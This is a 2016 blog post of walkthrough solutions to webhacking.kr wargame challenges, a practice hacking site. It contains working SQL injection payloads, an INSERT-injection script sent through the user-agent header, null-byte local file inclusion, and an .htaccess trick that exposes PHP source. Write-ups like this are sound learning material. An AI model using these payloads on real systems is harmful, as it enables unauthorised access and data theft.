---
layout:     post
title:      "Webhacking Kr"
subtitle:   "Solutions"
date:       2016-01-20 14:00:00
author:     "Heeraj"
header-img: "img/post-bg-02.png"
---
<script type='text/javascript' src='//eclkmpbn.com/adServe/banners?tid=98477_161886_3&type=footer&size=468x60'></script>
<p> If you like to read our old blogs you are welcome, <a href="http://heeraj123.wordpress.com">I4INFO</a> </p>

<p>For the past one week I was focusing on webhacking kr challenges, so I thought I would share the challenges solution that I was able to solve. They challenges were very, hats off to the team who had worked behind it.</p>

<p>Webhacking Challenge 01</p>

<p>In the first challenge, you have to change cookie value to a number which is in between 5 and 6. In chrome you can use editmycookie or if you are using you could use firebug or any other means</p>

<p>Webhacking Challenge 03</p>

<p>Its just an game which is very similar to soduku. The number gives you the count of the number of black box is possible. After clearing the you will see an input box, you may guess an sql injection. Then probably right , a simple sql injection but here you have to use pipe, that would be most difficult thing that you will take to figure out. But don't waste your time in trying sqli in input box. Try with burp suite, you can easily exploit.</p>

<blockquote>answer=1010100000011100101011111||1&id=kjkjkfd</blockquote>

<p>Webhacking Challenge 04</p>

<p>The thing before you something, you recognise more, a base64 encoding. Well when you decrypt you get something 40 length character. 40 is a big clue, If you have hash identifier tool, you may have till now probably got it. Ya sha1, now try to deocde, ya you have to decode you can use some online tool hashkiller. Again you will get the 40 length character. Decode again :)</p>

<p>Webhacking Challenge 05</p>

<p>In challenge5 you have both the login and join option. In join option when you click, then an alert box comes "Access Denied". When you look at the source you can see a move(),from there you can guess the location of the join(webhacking.kr/challenge/web/web-05/mem/join.php). From there you will be able to get the source code, source code may be difficult to understand. As told in the source code try to make an cookie oldzoombie as well your url should contain the required parameter mode. Then you can join, but to login as admin wouldn't be possible asthere would be one more admin. So you can use username as something as admin%20 and any pass you may like.</p>

<p>Webhacking Challenge 06</p>

<p>The first part of the  php code in the index.phps would give you the encoded id and password, getting the 20 times encoded and filtered id and pass.Create a cookie.</p>

<p>Webhacking Challenge 07</p>

<p>This is another sql injection, in this most of the sql statements are filtered, http://webhacking.kr/challenge/web/web-07/index.php?val=13)%0Aunion%0aselect%0a(5-3  </p>

<p>Webhacking Challenge 08</p>

<blockquote>
import requests<br>
import re<br><br>

url = "http://webhacking.kr/challenge/web/web-02/index.php"<br>
var=""<br>
s = requests.Session()<br>
headers = {'user-agent': "admin','1234','admin'), ('admin"}<br>
r = s.get("http://webhacking.kr/challenge/web/web-08/" , cookies={'PHPSESSID': 'dontseeoverhere'},headers=headers)<br>
res = r.text<br>
print res<br><br>

print "\nNext Request \n"<br>
s = requests.Session()<br>
headers = {'user-agent': "admin"}<br>
r = s.get("http://webhacking.kr/challenge/web/web-08/" , cookies={'PHPSESSID': 'dontseeoverhere'},headers=headers)<br>
res = r.text<br>
print res<br>
</blockquote>

<p>Webhacking Challenge 10</p>

<p>It was an simple challenge you have to go to ?go=800; you will get it document.write ("<a href='?go=800'> go </a>");</p>

<p>Webhacking Challenge 12</p>
<blockquote>
<br>
url : http://webhacking.kr/challenge/codeing/code3.html<br>
Hint:(variable worktime)<br>
<br>
var enco='';<br>
var enco2=126;<br>
var enco3=33;<br>
var ck=document.URL.substr(document.URL.indexOf('='));<br>
for(i=1;i<122;i++)<br>
{<br>
enco=enco+String.fromCharCode(i,0)<br>
}<br>
function enco_(x)<br>
{<br>
return enco.charCodeAt(x);<br>
}<br>
if(ck=="="+String.fromCharCode(enco_(240))+String.fromCharCode(enco_(220))+String.fromCharCode(enco_(232))+String.fromCharCode(enco_(192))+String.fromCharCode(enco_(226))+String.fromCharCode(enco_(200))+String.fromCharCode(enco_(204))+String.fromCharCode(enco_(222-2))+String.fromCharCode(enco_(198))+"~~~~~~"+String.fromCharCode(enco2)+String.fromCharCode(enco3))<br>
{<br>
alert("Password is "+ck.replace("=",""));<br>
}<br>
</blockquote>
When we make the if statement clear we can see that, ck should be equal to =youaregod~~~~~~~!<br>
Pass:Password is youaregod~~~~~~~!<br>

<p>Webhacking Challenge 20</p>

<p>
Read the page source carefully .
<br>
EXPLOIT CODE:<br>
javascript:lv5frm.id.value="a";<br> 
javascript:lv5frm.cmt.value="a";<br>
javascript:lv5frm.hack.value=lv5frm.attackme.value;<br> 
javascript:lv5frm.submit();<br>
<br>
Run 2-3 times repeatdly you may solve the challenge<br>
</p>

<p>Webhacking Challenge 25</p>

<p>
Local file inclusion. Use %00 can be used for local file inclusion<br>
eg: password.php%00<br>
In the case of windows u have to use ? or ;
</p>

<p>Webhacking Challenge 28</p>

<p>In this challenge , you have to view the password , which can only be done if you have a .htaccess file.The content of the file is given below.</p>

<blockquote>
php_flag engine off<br>
AddType text/plain php|<br>
</blockquote>

<p>Webhacking Challenge 29</p>

<p>Only way to bypass passing the lv as admin. Which can be done as we have insert option.So adding that is easily possible, but the problem would code can easily detect the admin. So we have to use a reverse function.You have 2 input spaces, in first field you have to input id can be anything, and phone can also be anything. So the only thing which is more important is to change is to make admin. The only way is to misuse insert.</p>

<blockquote>
id: nimda<br>
phone: 123,reverse(id)),(1,1<br>
</blockquote>
<p>I will come with next part of solution with in days</p>

<p>Thank you for reading the blog! </p>
